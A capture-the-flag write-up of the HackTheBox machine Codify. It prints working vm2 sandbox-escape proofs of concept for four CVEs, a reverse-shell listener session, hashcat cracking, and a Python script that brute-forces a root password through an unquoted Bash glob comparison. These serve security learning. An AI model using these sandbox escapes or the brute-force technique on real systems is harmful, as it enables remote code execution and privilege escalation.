HTB: Codify
===========

![Codify](https://0xdf.gitlab.io/img/codify-cover.png)

The website on Codify offers a JavaScript playground using the vm2 sandbox. I’ll abuse four different CVEs in vm2 to escape and run command on the host system, using that to get a reverse shell. Then I’ll find a hash in a sqlite database and crack it to get the next user. For root, I’ll abuse a script responsible for backup of the database. I’ll show two ways to exploit this script by abusing a Bash glob in an unquoted variable compare.

## Box Info

Name[Codify](https://www.hackthebox.com/machines/codify) [![Codify](https://0xdf.gitlab.io/icons/box-codify.png)](https://www.hackthebox.com/machines/codify)

[Play on HackTheBox](https://www.hackthebox.com/machines/codify)Release Date04 Nov 2023Retire Date06 Apr 2024OSLinux ![Linux](https://0xdf.gitlab.io/icons/Linux.png)Base PointsEasy \[20\]Rated Difficulty![Rated difficulty for Codify](https://0xdf.gitlab.io/img/codify-diff.png)Radar Graph![Radar chart for Codify](https://0xdf.gitlab.io/img/codify-radar.png)![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)02:16:40 [![j88001](https://www.hackthebox.eu/badge/image/288520)](https://app.hackthebox.com/users/288520)

![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)02:36:49 [![jkr](https://www.hackthebox.eu/badge/image/77141)](https://app.hackthebox.com/users/77141)

Creator[![kavigihan](https://www.hackthebox.eu/badge/image/389926)](https://app.hackthebox.com/users/389926)

## Recon

### nmap

`nmap` finds three open TCP ports, SSH (22) and two HTTP (80 and 3000):

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.239
Starting Nmap 7.80 ( https://nmap.org ) at 2024-04-04 00:06 EDT
Nmap scan report for 10.10.11.239
Host is up (0.11s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 7.84 seconds
oxdf@hacky$ nmap -p 22,80,3000 -sCV 10.10.11.239
Starting Nmap 7.80 ( https://nmap.org ) at 2024-04-04 00:06 EDT
Nmap scan report for 10.10.11.239
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.79 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 22.04 jammy. There’s also Node.js on 3000.

The site on port 80 is redirecting to `codify.htb`. I’ll fuzz both 80 and 3000 to see if any subdomains of `codify.htb` respond differently, but not find anything. I’ll add the domain to my `/etc/hosts` file:

```
oxdf@hacky$ head -1 /etc/hosts
10.10.11.239 codify.htb

```

### TCP 80 VS 3000

Both TCP ports 80 and 3000 are hosting a webserver, and on first glance, they appear to be the same page.

Looking at the HTTP headers for each, they are very similar. On 3000:

```
HTTP/1.1 200 OK
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Tue, 11 Apr 2023 11:29:55 GMT
ETag: W/"8dd-18770145b38"
Content-Type: text/html; charset=UTF-8
Content-Length: 2269
Date: Wed, 03 Apr 2024 21:25:21 GMT
Connection: close

```

On port 80:

```
HTTP/1.1 200 OK
Date: Wed, 03 Apr 2024 21:25:17 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Tue, 11 Apr 2023 11:29:55 GMT
ETag: W/"8dd-18770145b38-gzip"
Content-Type: text/html; charset=UTF-8
Vary: Accept-Encoding
Content-Length: 2269
Connection: close

```

The main difference is that on 80 there is an additional Apache `Server` header. This seems like a case where the application, running in JavaScript, is listening on 3000, and Apache is acting as a reverse proxy that handles the traffic to the application, providing services like load balancing. Typically 3000 would only be listening on localhost or on a non-publicly available server, but it can happen that both are accessible.

I can confirm this later when I get a shell by looking at `/etc/apache2/sites-enabled/000-default.conf`.

### Website - TCP 80 / 3000

#### Site

The site is for an online JavaScript sandbox:

![image-20240403174412227](https://0xdf.gitlab.io/img/image-20240403174412227.png)

The “limitations” link goes to `/limitations`, which talks about what modules are allowed to run:

![image-20240403174452273](https://0xdf.gitlab.io/img/image-20240403174452273.png)

It’s blocking things like `child_process` to prevent users from running commands on the system, and `fs` to prevent interacting with the files on the filesystem. There’s a list of supported modules, as well as an email address which I’ll note.

The “About us” link ( `/about`) has some background information, with details on the editor:

![image-20240403175003731](https://0xdf.gitlab.io/img/image-20240403175003731.png)

It’s using the [vm2](https://www.npmjs.com/package/vm2) NodeJS package, and the link goes to a specific release on GitHub, [v3.9.16](https://github.com/patriksimek/vm2/releases/tag/3.9.16).

`/editor` presents a form to enter JavaScript code:

![image-20240403175208561](https://0xdf.gitlab.io/img/image-20240403175208561.png)

On entering some JavaScript code and submitting, the output is shown on the right:

![image-20240403175244620](https://0xdf.gitlab.io/img/image-20240403175244620.png)

Brute forcing web paths with `feroxbuster` doesn’t find anything else of interest.

#### Tech Stack

The HTTP response headers show Apache with NodeJS / Express framework:

```
HTTP/1.1 200 OK
Date: Wed, 03 Apr 2024 21:25:17 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Tue, 11 Apr 2023 11:29:55 GMT
ETag: W/"8dd-18770145b38-gzip"
Content-Type: text/html; charset=UTF-8
Vary: Accept-Encoding
Content-Length: 2269
Connection: close

```

The site tells me that’s what it’s running, so nothing exciting here. I know it’s using vm2 version 3.9.16 as well.

## Shell as svc

### Find Vulnerability

#### Background

vm2 is a JavaScript sandbox, designed to run a limit set of JavaScript code in a safe manner preventing the code from reaching outside the sandbox. This would be used in cases where an application wanted to run code from untrusted sources (like in Codify, where the user is allow to submit arbitrary code).

If an attacker can escape the sandbox, they would have access to the full scope of JavaScript commands, which would include the ability to run arbitrary commands on the host OS.

#### Search

Searching for “vm2 exploit” returns a lot of results for several different CVEs in vm2:

![image-20240403175725545](https://0xdf.gitlab.io/img/image-20240403175725545.png)

The [synk page for vm2](https://security.snyk.io/package/npm/vm2) shows a bunch of vulnerabilities and what version they are vulnerable in. From this list, it seems like several might be good candidates for Codify:

![image-20240403193957552](https://0xdf.gitlab.io/img/image-20240403193957552.png)

CVE-2023-37903 links to [this GitHub Issue](https://github.com/patriksimek/vm2/issues/533), which talks about shutting down the entire project as it cannot be secured. On the vm2 Github repo [security tab](https://github.com/patriksimek/vm2/security) there are a bunch of issues, each with POCs:

![image-20240403194209374](https://0xdf.gitlab.io/img/image-20240403194209374.png)

### Evaluating POCs

There are four critical RCE CVEs that should work on version 3.9.16:

CVEVersionLinksCVE-2023-37903<=3.9.19[Snyk](https://security.snyk.io/vuln/SNYK-JS-VM2-5772823), [GitHub](https://github.com/patriksimek/vm2/security/advisories/GHSA-g644-9gfx-q4q4), [POC](https://gist.github.com/leesh3288/e4aa7b90417b0b0ac7bcd5b09ac7d3bd)CVE-2023-37466<=3.9.19[Snyk](https://security.snyk.io/vuln/SNYK-JS-VM2-5772825), [GitHub](https://github.com/patriksimek/vm2/security/advisories/GHSA-cchq-frgv-rjh5), [POC](https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9)CVE-2023-32314<3.9.18[Snyk](https://security.snyk.io/vuln/SNYK-JS-VM2-5537100), [GitHub](https://github.com/patriksimek/vm2/security/advisories/GHSA-whpj-8f3w-67p5), [POC](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)CVE-2023-30547<3.9.17[Snyk](https://security.snyk.io/vuln/SNYK-JS-VM2-5426093), [GitHub](https://github.com/patriksimek/vm2/security/advisories/GHSA-ch3r-j5x3-6q2m), [POC](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244)

In checking out different POCs, they are each structured like this:

![image-20240403194455864](https://0xdf.gitlab.io/img/image-20240403194455864.png)

Thinking about what the website is doing, it is handling the vm2 setup and calling the code. I’m only passing in what I want to be run. So when looking at these POCs, I’ll want to only copy the `code` variable value.

### Execution

There are four known CVEs that will work to get RCE here. One works completely as is, and the others take some small changes to show execution. I’ll show all four, though any one will work to get execution.

#### CVE-2023-32314

This CVE is the most straight-forward to exploit as testing it requires no modification at all. It escapes the sandbox using the `Proxy` object. This [page on Snyk](https://security.snyk.io/vuln/SNYK-JS-VM2-5537100), or [this POC](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac) linked to from the Security tab give the same POC:

```
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("echo hacked").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }

```

The POC will run `echo hacked`, and on pasting it into Codify, it works:

![image-20240403200034171](https://0xdf.gitlab.io/img/image-20240403200034171.png)

#### CVE-2023-30547

The next most straight forward to exploit is [CVE-2023-30547](https://security.snyk.io/vuln/SNYK-JS-VM2-5426093), which has to do with raising an exception inside of `handleException()`. There is [POC code](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244) linked to on the [GitHub security issue](https://github.com/patriksimek/vm2/security/advisories/GHSA-ch3r-j5x3-6q2m) as well as a [POC on ExploitDB](https://www.exploit-db.com/exploits/51898) (which is incorrectly linked to on the [CVE-2023-37466 page on Snyk](https://security.snyk.io/vuln/SNYK-JS-VM2-5772825)).

The code part looks like:

```
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};

const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
}

```

The only trick here is seeing that it is using the `child_process` module’s `execSync` function to run `touch pwned`, which will create a `pwned` file in the current directory. That doesn’t help much at this point, as I don’t have access to the filesystem to see the result. I’ll want to change it to something I can see, like `id`, and then paste it in, and the result is the output of that command on Codify:

![image-20240403195800662](https://0xdf.gitlab.io/img/image-20240403195800662.png)

#### CVE-2023-37903

[CVE-2023-37903](https://security.snyk.io/vuln/SNYK-JS-VM2-5772823) abuses how NodeJS allows for a custom `inspect` function to be defined:

```
const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');

obj = {
    [customInspectSymbol]: (depth, opt, inspect) => {
        inspect.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
    },
    valueOf: undefined,
    constructor: undefined,
}

WebAssembly.compileStreaming(obj).catch(()=>{});

```

This POC has the same issue that I need to change the payload from `touch pwned` to something else, but even then, it doesn’t show the result:

![image-20240404072941416](https://0xdf.gitlab.io/img/image-20240404072941416.png)

What’s returned is a JavaScript `Promise` object. There are probably ways to get the result from this, but I wasn’t able to figure it out with my limited JavaScript skills. Instead, I’ll test a blind payload, like `ping`. I’ll start `tcpdump` on my host listening for ICMP packets, and then run `ping -c 1 10.10.14.6` (the `-c 1` is important on Linux systems as without it, `ping` will run forever):

```
oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
02:46:49.800538 IP 10.10.11.239 > 10.10.14.6: ICMP echo request, id 2, seq 1, length 64
02:46:49.800564 IP 10.10.14.6 > 10.10.11.239: ICMP echo reply, id 2, seq 1, length 64

```

An ICMP packet arrives at my host, which is evidence that the code executed.

#### CVE-2023-37466

This vulnerability is in the `Promise` handler:

```
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch pwned'); }
            )
        }
    }
};
p.then();

```

It is the same as the previous one, though it returns `[object Object]`. Changing it to `ping` works here as well.

### Shell

I’ll update my payload to a simple [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw), and start `nc` listening on the same port:

![image-20240404092743068](https://0xdf.gitlab.io/img/image-20240404092743068.png)

On sending the code, the site hangs, but there’s a connection at `nc` with a shell as the svc user:

```
oxdf@hacky$ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.239 35468
bash: cannot set terminal process group (1264): Inappropriate ioctl for device
bash: no job control in this shell
svc@codify:~$

```

I’ll upgrade my shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```
svc@codify:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
svc@codify:~$ ^Z
[1]+  Stopped                 nc -lvnp 443
oxdf@hacky$ stty raw -echo; fg
nc -lvnp 443
            reset
svc@codify:~$

```

## Shell as joshua

### Enumeration

#### Home Directories

The home directory for svc is basically empty (there is a `pwned` file I must have created pasting a POC exploit in):

```
svc@codify:~$ ls -la
total 32
drwxr-x--- 4 svc    svc    4096 Apr  4 11:00 .
drwxr-xr-x 4 joshua joshua 4096 Sep 12  2023 ..
lrwxrwxrwx 1 svc    svc       9 Sep 14  2023 .bash_history -> /dev/null
-rw-r--r-- 1 svc    svc     220 Sep 12  2023 .bash_logout
-rw-r--r-- 1 svc    svc    3771 Sep 12  2023 .bashrc
drwx------ 2 svc    svc    4096 Sep 12  2023 .cache
drwxrwxr-x 5 svc    svc    4096 Apr  3 20:53 .pm2
-rw-r--r-- 1 svc    svc     807 Sep 12  2023 .profile
-rw-r--r-- 1 svc    svc       0 Apr  4 13:25 pwned
-rw-r--r-- 1 svc    svc      39 Sep 26  2023 .vimrc

```

There’s one other directory in `/home`, but svc can’t access it:

```
svc@codify:/home$ ls
joshua  svc
svc@codify:/home$ cd joshua/
bash: cd: joshua/: Permission denied

```

#### Web Directories

There are three directories in `/var/www`:

```
svc@codify:/var/www$ ls
contact  editor  html

```

`html` has the default Apache landing page.

`editor` has the source code for the web application on 80/3000:

```
svc@codify:/var/www$ ls editor/
index.js  node_modules  package.json  package-lock.json  templates

```

`contact` seems to have a different web application that doesn’t seem to be running on Codify:

```
svc@codify:/var/www$ ls contact/
index.js  package.json  package-lock.json  templates  tickets.db

```

### Contact Application

#### Source Analysis

I don’t see this application running anywhere (it’s not configured in Apache or running with pm2), but I’ll still take a look. It’s another Express application:

```
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bcrypt = require('bcryptjs');
const session = require('express-session');
const app = express();
const port = 3001;

// create a new database and table
const db = new sqlite3.Database('tickets.db');
db.run('CREATE TABLE IF NOT EXISTS tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)');
db.run('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT)');

// initialize the session
app.use(session({
    secret: 'G3U9SHG29S872HA028DH278D9178D90A782GH',
    resave: false,
    saveUninitialized: true
}));

// redirect to login if not logged in, else to tickets
app.get('/', (req, res) => {
    try {
        if (req.session.userId) {
            res.sendStatus(200);
            res.redirect('/tickets');
            return;
        } else {
            res.redirect('/login');
            return;
        }

    } catch (e) {
        res.redirect('/login');
        return;
    }

});

// endpoint to show the login form
app.get('/login', (req, res) => {
    res.sendFile(__dirname + '/templates/login.html');
});

// endpoint to show the ticket list
app.get('/tickets', (req, res) => {
    if (!req.session.userId) {
        res.sendStatus(401);
        return;
    }

    res.sendFile(__dirname + '/templates/tickets.html');
});

app.get('/submit_ticket', function(req, res) {
    res.sendFile(__dirname + '/templates/ticket.html');
});

// endpoint to handle the login form submission
app.post('/login', (req, res) => {
    // read the data from the request body
    let data = '';
    req.on('data', chunk => {
        data += chunk;
    });
    req.on('end', () => {
        const formData = new URLSearchParams(data);
        const username = formData.get('username');
        const password = formData.get('password');

        db.get('SELECT id, username, password FROM users WHERE username = ?', [username], (err, row) => {
            if (err) {
                console.error(err.message);
                res.sendStatus(500);
                return;
            }

            if (!row) {
                res.sendStatus(401);
                return;
            }

            // check the password hash
            bcrypt.compare(password, row.password, (err, result) => {
                if (err) {
                    console.error(err.message);
                    res.sendStatus(500);
                    return;
                }

                if (!result) {
                    res.sendStatus(401);
                    return;
                }

                // store the user ID in the session
                req.session.userId = row.id;

                res.redirect('/tickets');
            });
        });
    });
});

// endpoint to submit a ticket
app.post('/submit_ticket', (req, res) => {
    // read the data from the request body
    let data = '';
    req.on('data', chunk => {
        data += chunk;
    });
    req.on('end', () => {
        const formData = new URLSearchParams(data);
        const name = formData.get('name');
        const topic = formData.get('topic');
        const description = formData.get('description');

        // insert the data into the database
        const stmt = db.prepare('INSERT INTO tickets (name, topic, description, status) VALUES (?, ?, ?, ?)');
        stmt.run(name, topic, description, "open", err => {
            if (err) {
                console.error(err.message);
                res.sendStatus(500);
            } else {
                res.send('Ticket created successfully.');
            }
        });
    });
});

// endpoint to show the ticket list in json
app.get('/api/tickets', (req, res) => {
    if (!req.session.userId) {
        res.sendStatus(401);
        return;
    }

    // look up the tickets in the database
    db.all('SELECT id, name, topic, description, status FROM tickets', (err, rows) => {
        if (err) {
            console.error(err.message);
            res.sendStatus(500);
            return;
        }

        res.send(rows);
    });
});

// endpoint to log out
app.post('/logout', (req, res) => {
    delete req.session.userId;
    res.redirect('/');
});
// start the server
app.listen(port, () => {
    console.log(`Server listening on port ${port}`);
});

```

It’s also loading `ticket.db` at the top of the application as a SQLite database.

To get a quick look at the routes, I’ll `grep`:

```
svc@codify:/var/www/contact$ cat index.js  | grep 'app\.'
app.use(session({
app.get('/', (req, res) => {
app.get('/login', (req, res) => {
app.get('/tickets', (req, res) => {
app.get('/submit_ticket', function(req, res) {
app.post('/login', (req, res) => {
app.post('/submit_ticket', (req, res) => {
app.get('/api/tickets', (req, res) => {
app.post('/logout', (req, res) => {
app.listen(port, () => {

```

There’s login functionality as well.

#### Database

The database file has two tables:

```
svc@codify:/var/www/contact$ sqlite3 tickets.db
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
tickets  users

```

`.schema` will give information about the columns in each table:

```
sqlite> .schema tickets
CREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT);
sqlite> .schema users
CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    );

```

`tickets` doesn’t have anything interesting:

```
sqlite> .headers on
sqlite> select * from tickets;
id|name|topic|description|status
1|Tom Hanks|Need networking modules|I think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!|open
2|Joe Williams|Local setup?|I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.|open

```

`users` has a single row:

```
sqlite> select * from users;
id|username|password
3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

```

### Crack Password

I’ll save that hash to a file and pass it to `hashcat`:

```
$ cat joshua.hash
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
$ hashcat joshua.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
...[snip]...

```

It tries to match the hash format, but there are four options it finds that could match. There’s a few ways to figure this out:

- If this were a live application, create a user and then try to crack that hash with a very short wordlist that includes the password I created. That way I know the format works or doesn’t.
- Look at the source. It’s fetching the row based on the username, and then passing the input password along with the password hash in the row to `bcrypt.compare` on line 85. This is a good indication it’s using straight bcrypt (3200).
- Just guess that it’s the simplest one, and see if it works.

I’ll try again with the basic Blowfish, 3200:

```
oxdf@corum:~/hackthebox/codify-10.10.11.239$ hashcat -m 3200 joshua.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting
...[snip]...
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
...[snip]...

```

It cracks to “spongebob1”.

### Shell

That password works for joshua with `su`:

```
svc@codify:~$ su - joshua
Password:
joshua@codify:~$

```

It also works for SSH:

```
oxdf@hacky$ sshpass -p spongebob1 ssh joshua@codify.htb
Warning: Permanently added 'codify.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)
...[snip]...
joshua@codify:~$

```

joshua has access to `user.txt`:

```
joshua@codify:~$ cat user.txt
6a3e7712************************

```

## Shell as root

### Enumeration

joshua can run a backup shell script as root:

```
joshua@codify:~$ sudo -l
[sudo] password for joshua:
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh

```

### mysql-backup.sh

At a high level, the script is meant to do a dump of the MySQL database and save it into a backup directory:

```
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'

```

It reads creds from `/root/.cred`, and prompts the user to enter the root password. It checks that they match, and then proceeds to get a list of databases and then save each to a compressed file.

### Vulnerabilities

There are two potential issues in this script:

- The password comparison isn’t using quote marks. Bash [has issues](https://mywiki.wooledge.org/BashPitfalls#A.5B_.24foo_.3D_.22bar.22_.5D) when doing comparisons of strings where a variable is expanded not in “”. I exploited this in [Hackvent 2023 Day 8](https://0xdf.gitlab.io/hackvent2023/medium#hv2308).



```
if [[ $DB_PASS == $USER_PASS ]]; then
          /usr/bin/echo "Password confirmed!"
else
          /usr/bin/echo "Password confirmation failed!"
          exit 1
fi

```



Because `$USER_PASS` is not in `"`, I can easily bypass this check, and with a bit more work, recover the value of `$DB_PASS`.

- The calls to `mysql` and `mysqldump` are done by passing the password in on the command line, and they use the one read from the file, not the user input one. This means that any user watching the process list (unless `/proc` is mounted with `hidepid`, which it isn’t) can see the password when this is run.



```
databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
      /usr/bin/echo "Backing up database: $db"
      /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

```


### Exploit

This is much easier than the Hackvent case because I don’t need to recover the password in the Bash glob vulnerability. Still, it can be done that was as well. I’ll show both:

```
  flowchart TD;
      A[Shell as joshua]-->B(Bypass password\ncheck via glob);
      B-->C(Watch process list);
      C-->D[Recover root password];
      A-->E(Brute force password\nvia glob);
      E-->D;
      subgraph identifier[" "]
        direction LR
        start1[ ] --->|intended| stop1[ ]
        style start1 height:0px;
        style stop1 height:0px;
        start2[ ] --->|unintended| stop2[ ]
        style start2 height:0px;
        style stop2 height:0px;
      end

  linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
  linkStyle 3,4,6 stroke-width:2px,stroke:#4B9CD3,fill:none;
  style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

#### Bypass + Monitor

When the script is run, it prompts for a password:

```
joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root:

```

Entering the wrong password exits the script:

```
joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root:
Password confirmation failed!

```

However, entering “\*” (the input is not shown on the terminal because the `-s` flag is used with `read`) bypasses the check:

```
joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root:
Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
Backing up database: sys
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
All databases backed up successfully!
Changing the permissions
Done!

```

To watch for the processes, I’ll upload PSpy. I’ll download the [latest release](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1) (v1.2.1 at the time of writing this post), and save it in `/opt` on my host. Now I’ll serve that directory with a Python web server:

```
oxdf@hacky$ python -m http.server 80 -d /opt/
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

I’ll fetch it from Codify:

```
joshua@codify:/dev/shm$ wget 10.10.14.6/pspy64
--2024-04-04 16:37:21--  http://10.10.14.6/pspy64
Connecting to 10.10.14.6:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64              100%[===================>]   2.96M  4.34MB/s    in 0.7s

2024-04-04 16:37:22 (4.34 MB/s) - ‘pspy64’ saved [3104768/3104768]

```

I’ll set it as executable and run it:

```
joshua@codify:/dev/shm$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
...[snip]...

```

Once it gets through all the start up, in a different session as joshua, I’ll run the script again, entering “\*” as the password. PSpy won’t catch it every time, but after a run or two, I’ll catch the command line for `mysqldump`:

```
2024/04/04 16:46:17 CMD: UID=0     PID=3758   | /usr/bin/mysql -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 -e SHOW DATABASES;

```

The password is “kljh12k3jhaskjh12kjh3” (as `-p` is the flag for the password).

#### Brute Force Password

The trickier route is to abuse the unsafe comparison with wildcards to test the password. For example if I enter “a\*” as the password, it fails:

```
joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root:
Password confirmation failed!

```

If I enter “k\*”, it works:

```
joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root:
Password confirmed!
...[snip]...

```

I can give the password without waiting for the prompt as well, but piping it into the process:

```
joshua@codify:~$ echo "*" | sudo /opt/scripts/mysql-backup.sh

Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
...[snip]...

```

Putting that together, I can write a Python script that will try all characters to find the password:

```
#!/usr/bin/env python3

import subprocess
import string

leaked_password = ""

while True:
    for c in string.printable[:-5]:
        if c in '*\\%':
            continue
        print(f"\r{leaked_password}{c}", flush=True, end="")
        result = subprocess.run(f"echo '{leaked_password}{c}*' | sudo /opt/scripts/mysql-backup.sh", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        if "Password confirmed" in result.stdout.decode():
            leaked_password += c
            break
    else:
        break
print(f'\r{leaked_password}        ')

```

Running this takes 35-40 seconds, and finds the password:

![](https://0xdf.gitlab.io/img/brute-password-1.gif)

I can make this faster. It hangs each time it finds the correct password because the process on success takes longer to run. What if I give `subprocess.run` a timeout? I’ll have to assume that any time it hits the timeout, it’s because the password was accepted:

```
#!/usr/bin/env python3

import subprocess
import string

leaked_password = ""

while True:
    for c in string.printable[:-5]:
        if c in '*\\%':
            continue
        print(f"\r{leaked_password}{c}", flush=True, end="")
        success = False
        try:
            result = subprocess.run(f"echo '{leaked_password}{c}*' | sudo /opt/scripts/mysql-backup.sh", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, timeout=0.3)
        except subprocess.TimeoutExpired:
             success = True
        if success or "Password confirmed" in result.stdout.decode():
            leaked_password += c
            break
    else:
        break
print(f'\r{leaked_password}        ')

```

Running that gets down under 20 seconds:

```
joshua@codify:/dev/shm$ time python3 leak_password.py
kljh12k3jhaskjh12kjh3

real    0m18.253s
user    0m2.193s
sys     0m2.820s

```

Minor improvement, so probably not worth it here, but if the delay on success was longer, it would definitely be!

### su

With the password, I can `su` to root:

```
joshua@codify:/dev/shm$ su -
Password:
root@codify:~#

```

And grab `root.txt`:

```
root@codify:~# cat root.txt
fe1a209e************************

```





